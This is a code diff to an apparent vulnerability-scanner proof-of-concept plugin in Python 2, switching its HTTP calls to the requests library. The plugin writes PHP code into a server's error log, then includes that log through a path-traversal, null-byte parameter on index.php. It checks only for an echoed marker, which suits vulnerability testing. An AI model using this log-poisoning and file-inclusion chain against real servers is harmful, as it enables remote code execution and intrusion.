@@ -35,12 +35,12 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             url = arg
-            exp1 = "\"" + url + "/<?php echo '03815b953d00d9d146f629d6f6c29dc7';?>\""
+            exp1 = url + "/<?php echo '03815b953d00d9d146f629d6f6c29dc7';?>"
             exp2 = url + "/index.php?controller=../../../../Server/logs/error.log%00.php"
             hh.http(exp1)
-            code ,_ ,body ,_,_ = hh.http(exp2)
-            if code ==200:
-                if re.findall(r'03815b953d00d9d146f629d6f6c29dc7',body):
+            req = requests.get(exp2)
+            if req.status_code ==200:
+                if re.findall(r'03815b953d00d9d146f629d6f6c29dc7',req.text):
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
